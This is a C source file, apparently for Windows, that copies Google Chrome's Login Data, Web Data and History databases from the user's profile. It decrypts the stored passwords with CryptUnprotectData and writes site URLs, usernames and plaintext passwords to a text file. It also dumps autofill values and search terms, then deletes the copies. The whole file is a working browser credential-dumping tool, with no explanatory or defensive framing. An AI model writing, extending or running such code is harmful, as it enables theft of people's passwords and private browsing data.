#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <Wincrypt.h>
#include "sqlite3.h"

void fetchFiles(void){
    char path[512];
    sprintf(path, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
    if(!CopyFile(path, "Login Data", FALSE)){
        printf("Error while fetching Login Data.\n");
        exit(1);
    }
    sprintf(path, "%s\\Google\\Chrome\\User Data\\Default\\Web Data", getenv("LOCALAPPDATA"));
    if(!CopyFile(path, "Web Data", FALSE)){
        printf("Error while fetching Web Data.\n");
        exit(1);
    }
    sprintf(path, "%s\\Google\\Chrome\\User Data\\Default\\History", getenv("LOCALAPPDATA"));
    if(!CopyFile(path, "History", FALSE)){
        printf("Error while fetching History.\n");
        exit(1);
    }
}

void removeFiles(void){
    while(!DeleteFile("Login Data")) ;
    while(!DeleteFile("Web Data")) ;
    while(!DeleteFile("History")) ;
}

void getLoginData(void){
    sqlite3 *db;
    sqlite3_stmt *res;
    FILE *fp;
    const BYTE *pw_raw;
    DATA_BLOB cryptDataIn, cryptDataOut;
    int i;

    if(sqlite3_open("Login Data", &db) != SQLITE_OK){
        printf("Cannot connect to database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        exit(1);
    }
    if(sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &res, 0) != SQLITE_OK){
        fprintf(stderr, "Query failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        exit(1);
    }
    fp = fopen("chrome_login_data.txt", "wt");
    while(sqlite3_step(res) == SQLITE_ROW){
        pw_raw = sqlite3_column_blob(res, 2);
        cryptDataIn.pbData = pw_raw;    
        cryptDataIn.cbData = sqlite3_column_bytes(res, 2);
        CryptUnprotectData(&cryptDataIn, NULL, NULL, NULL, NULL, 0, &cryptDataOut);
        fprintf(fp, "URL: %s\n", sqlite3_column_text(res, 0));
        fprintf(fp, "    User: %s\n", sqlite3_column_text(res, 1));
        fprintf(fp, "    Password: ");
        for(i=0; i<cryptDataOut.cbData; i++) fprintf(fp, "%c", cryptDataOut.pbData[i]);
        fprintf(fp, "\n\n");
        SecureZeroMemory(cryptDataIn.pbData, cryptDataIn.cbData);
        SecureZeroMemory(cryptDataOut.pbData, cryptDataOut.cbData);
        LocalFree(cryptDataIn.pbData);
        LocalFree(cryptDataOut.pbData);
    }
    fclose(fp);
    printf("Login data successfully written to chrome_login_data.txt\n");

    sqlite3_finalize(res);
    sqlite3_close(db);
}

void getWebData(void){
    sqlite3 *db;
    sqlite3_stmt *res;
    FILE *fp;
    time_t t;
    struct tm lt;
    char timebuf[80];

    if(sqlite3_open("Web Data", &db) != SQLITE_OK){
        printf("Cannot connect to database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        exit(1);
    }
    if(sqlite3_prepare_v2(db, "SELECT name, value, date_created, date_last_used, count FROM autofill", -1, &res, 0) != SQLITE_OK){
        fprintf(stderr, "Query failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        exit(1);
    }
    fp = fopen("chrome_autofill_data.txt", "wt");
    while(sqlite3_step(res) == SQLITE_ROW){
        fprintf(fp, "Name: %s\n", sqlite3_column_text(res, 0));
        fprintf(fp, "    Value: %s\n", sqlite3_column_text(res, 1));
        t = sqlite3_column_int(res, 2);
        lt = *localtime(&t);
        strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", &lt);
        fprintf(fp, "    Date created: %s\n", timebuf);
        t = sqlite3_column_int(res, 3);
        lt = *localtime(&t);
        strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", &lt);
        fprintf(fp, "    Date last used: %s\n", timebuf);
        fprintf(fp, "    Count: %d\n\n", sqlite3_column_int(res, 4));
    }
    fclose(fp);
    printf("Autofill data successfully written to chrome_autofill_data.txt\n");

    sqlite3_finalize(res);
    sqlite3_close(db);
}

void getSearchData(void){
    sqlite3 *db;
    sqlite3_stmt *res;
    FILE *fp;

    if(sqlite3_open("History", &db) != SQLITE_OK){
        printf("Cannot connect to database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        exit(1);
    }
    if(sqlite3_prepare_v2(db, "SELECT urls.url, keyword_search_terms.term FROM keyword_search_terms INNER JOIN urls ON urls.id=keyword_search_terms.url_id", -1, &res, 0) != SQLITE_OK){
        fprintf(stderr, "Query failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        exit(1);
    }
    fp = fopen("chrome_search_data.txt", "wt");
    while(sqlite3_step(res) == SQLITE_ROW){
        fprintf(fp, "URL: %s\n", sqlite3_column_text(res, 0));
        fprintf(fp, "Term: %s\n\n\n", sqlite3_column_text(res, 1));
    }
    fclose(fp);
    printf("Search history successfully written to chrome_search_data.txt\n");

    sqlite3_finalize(res);
    sqlite3_close(db);
}

int main(){
    fetchFiles();
    getLoginData();
    getWebData();
    getSearchData();
    removeFiles();
    return 0;
}
